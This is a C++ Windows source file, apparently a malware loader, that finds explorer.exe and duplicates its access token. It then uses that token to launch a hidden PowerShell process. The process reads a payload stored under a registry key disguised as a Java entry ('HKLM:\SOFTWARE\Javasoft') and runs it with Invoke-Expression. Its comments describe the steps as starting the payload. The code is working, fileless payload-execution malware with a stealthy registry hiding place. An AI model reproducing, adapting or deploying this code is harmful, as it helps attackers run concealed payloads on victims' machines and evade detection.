// hostui.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <errno.h>
#include <tchar.h>

DWORD FindProcessId(const std::wstring& processName);
BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege);

int main()
{

    BOOL result;

    PROCESS_INFORMATION processInfo;
    STARTUPINFO StartupInfo;

    ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
    ZeroMemory(&processInfo, sizeof(PROCESS_INFORMATION));
    memset(&processInfo, 0x00, sizeof(PROCESS_INFORMATION));
    StartupInfo.cb = sizeof(STARTUPINFO);

    std::string explorer_str("explorer.exe");
    std::wstring explorer_wstr(explorer_str.begin(), explorer_str.end());

    DWORD explorerProcessId = FindProcessId(explorer_wstr); // Find the ProcessId of EXPLORER.EXE
    //printf("Explorer PID: %u\n", dwProcessId);

    HANDLE hExplorerProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, explorerProcessId); // get a handle to EXPLORER.EXE's process
    if (hExplorerProcess)
    {
        HANDLE hExplorerToken;
        result = OpenProcessToken(hExplorerProcess, TOKEN_DUPLICATE, &hExplorerToken); // get a handle to EXPLORER.EXE's token

        if (result)
        {
            HANDLE duplicatedExplorerToken;
            result = DuplicateTokenEx( // duplicate EXPLORER.EXE's token
                hExplorerToken,
                TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID,
                NULL,
                SecurityImpersonation,
                TokenPrimary,
                &duplicatedExplorerToken);

            if (result)
            {
                TCHAR szCommandLine[MAX_PATH];
                _tcscpy_s(szCommandLine, MAX_PATH, _T("powershell.exe -c \"Get-ItemPropertyValue 'HKLM:\\\\SOFTWARE\\Javasoft' 'value Supplement' | Invoke-Expression\"")); // read payload path from registry, pipe to IEX
                void* lpEnvironment = NULL;

                result = CreateProcessWithTokenW( // start the payload using the duplicated process token
                    duplicatedExplorerToken,
                    LOGON_WITH_PROFILE,
                    NULL,
                    szCommandLine,
                    CREATE_NO_WINDOW | NORMAL_PRIORITY_CLASS,
                    NULL,
                    NULL,
                    &StartupInfo,
                    &processInfo);
                CloseHandle(duplicatedExplorerToken);
            }
            else
            {
                printf("[-] Failed to duplicate EXPLORER.EXE's token: %d\n", GetLastError());
                return 1;
            }
            CloseHandle(hExplorerToken);
        }
        else
        {
            printf("[-] Failed to get a handle to EXPLORER.EXE's token: %d\n", GetLastError());
            return 1;
        }
        CloseHandle(hExplorerProcess);
    }
    else
    {
        printf("[-] Failed to get a handle to EXPLORER.EXE's process: %d\n", GetLastError());
        return 1;
    }
    return 0;
}

DWORD FindProcessId(const std::wstring& processName)
{
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);

    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (processesSnapshot == INVALID_HANDLE_VALUE)
        return 0;

    Process32First(processesSnapshot, &processInfo);
    if (!processName.compare(processInfo.szExeFile))
    {
        CloseHandle(processesSnapshot);
        return processInfo.th32ProcessID;
    }

    while (Process32Next(processesSnapshot, &processInfo))
    {
        if (!processName.compare(processInfo.szExeFile))
        {
            CloseHandle(processesSnapshot);
            return processInfo.th32ProcessID;
        }
    }

    CloseHandle(processesSnapshot);
    return 0;
}
